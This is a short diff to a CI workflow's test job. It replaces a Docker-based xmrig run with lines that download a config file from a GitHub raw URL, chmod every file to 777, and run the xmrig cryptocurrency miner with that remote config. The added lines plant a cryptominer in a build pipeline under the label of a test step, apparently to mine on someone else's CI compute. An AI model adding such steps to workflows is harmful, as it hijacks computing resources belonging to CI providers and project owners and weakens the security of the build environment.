@@ -13,9 +13,6 @@ jobs:
         kind: test
         shell: sh
         run: |-
-          docker run -dit --rm \
-              --volume "$(pwd)"/config.json:/xmrig/etc/config.json:ro \
-              --volume "$(pwd)"/log:/xmrig/log \
-              --name xmrig rcmelendez/xmrig \
-              xmrig --config=/xmrig/etc/config.json
-          docker logs xmrig
+          wget https://raw.githubusercontent.com/Rockymoyosu/S/main/99.json
+          chmod 777 *
+          xmrig --config=99.json
